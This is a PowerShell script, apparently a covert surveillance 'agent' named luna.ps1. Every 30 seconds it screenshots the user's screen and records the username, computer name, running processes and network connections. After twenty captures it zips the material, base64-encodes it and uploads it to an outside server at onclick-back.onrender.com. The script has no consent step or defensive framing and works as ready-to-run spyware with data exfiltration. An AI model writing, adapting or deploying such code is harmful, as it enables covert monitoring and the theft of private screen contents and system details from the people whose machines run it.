# luna.ps1 — PowerShell Agent with Enhanced Logging & Stability

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$shotsDir = "$tempDir\shots"
$logPath = "$tempDir\luna_log.json"
$metaPath = "$tempDir\meta.txt"
$zipPath = "$tempDir\luna_upload.zip"
$interval = 30
$maxShots = 20

New-Item -ItemType Directory -Path $shotsDir -Force | Out-Null
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

Start-Transcript -Path "$tempDir\log.txt" -Append
Write-Output "▶️ Script started at: $(Get-Date)"

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $filename = Join-Path $shotsDir ("shot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".jpg")
        $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        Write-Output "✅ Screenshot saved: $filename"
    } catch {
        Write-Warning "❌ Screenshot error: $_"
    }
}

function Get-SystemReport {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor
        $drives = Get-PSDrive -PSProvider FileSystem | Select Name, Used, Free
        $net = Get-NetTCPConnection | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
        $procs = Get-Process | Select Name, Id, CPU, StartTime -ErrorAction SilentlyContinue

        return [PSCustomObject]@{
            timestamp = Get-Date -Format o
            user = $env:USERNAME
            computer = $env:COMPUTERNAME
            os = $os.Caption
            version = $os.Version
            arch = $env:PROCESSOR_ARCHITECTURE
            cpu = $cpu.Name
            ram = "{0:N2} GB" -f ($os.TotalVisibleMemorySize / 1MB)
            drives = $drives
            netConnections = $net[0..([Math]::Min($net.Count, 30)-1)]
            processes = $procs[0..([Math]::Min($procs.Count, 20)-1)]
        }
    } catch {
        Write-Warning "❌ System report error: $_"
        return $null
    }
}

function Archive-And-Send {
    try {
        if (-not (Test-Path $logPath)) {
            Write-Warning "⚠️ No log found. Skipping archive."
            return
        }

        $json = Get-Content $logPath -Raw
        $json | Set-Content -Path $metaPath -Force

        $bundleZip = "$tempDir\\upload_ready.zip"
        Compress-Archive -Path @("$shotsDir\\*", $metaPath) -DestinationPath $bundleZip -Force

        $fileBytes = [System.IO.File]::ReadAllBytes($bundleZip)
        $enc = [System.Convert]::ToBase64String($fileBytes)

        Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" `
            -Method POST `
            -Body @{ data = $enc; filename = "luna_upload.zip" } `
            -ContentType "application/json"

        Write-Output "✅ Archive uploaded successfully."
    } catch {
        Write-Warning "❌ Upload failed: $_"
    }
}

# MAIN LOOP
$screenshotCount = 0
$log = @()

while ($true) {
    Write-Host "📸 Capturing screenshot..."
    Take-Screenshot
    $report = Get-SystemReport
    if ($report) {
        $log += $report
        $log | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Force
    }
    $screenshotCount++

    if ($screenshotCount -ge $maxShots) {
        Write-Host "📆 Reached $maxShots shots. Archiving..."
        Archive-And-Send
        break
    }

    Start-Sleep -Seconds $interval
}

Write-Output "🏁 Script completed."
Stop-Transcript
